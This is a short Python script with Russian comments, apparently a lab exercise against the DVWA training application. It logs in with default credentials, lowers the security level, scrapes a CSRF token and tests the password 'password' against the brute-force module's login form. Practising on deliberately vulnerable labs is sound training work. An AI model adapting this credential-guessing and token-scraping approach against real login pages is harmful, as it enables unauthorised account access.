#!/usr/bin/python3
import requests
import re

s = requests.Session()

# 1. Логин
s.post("http://dvwa.local/login.php",
      data={'username':'admin','password':'password','Login':'Login'})

# 2. Security
s.post("http://dvwa.local/security.php",
      data={'security':'low','seclev_submit':'Submit'})

# 3. Получить CSRF токен
r = s.get("http://dvwa.local/vulnerabilities/brute/")
csrf = re.search(r'user_token" value="([^"]+)"', r.text).group(1)

# 4. Тест с CSRF
url = f"http://dvwa.local/vulnerabilities/brute/?username=admin&password=password&Login=Login&user_token={csrf}"
r = s.get(url)

if 'Welcome to the password protected area' in r.text:
    print("SUCCESS: Password 'password' works!")
    # Найти и показать
    for line in r.text.split('\n'):
        if 'Welcome' in line:
            print(line.strip())
else:
    print("Failed - check response")
    print(r.text[:200])
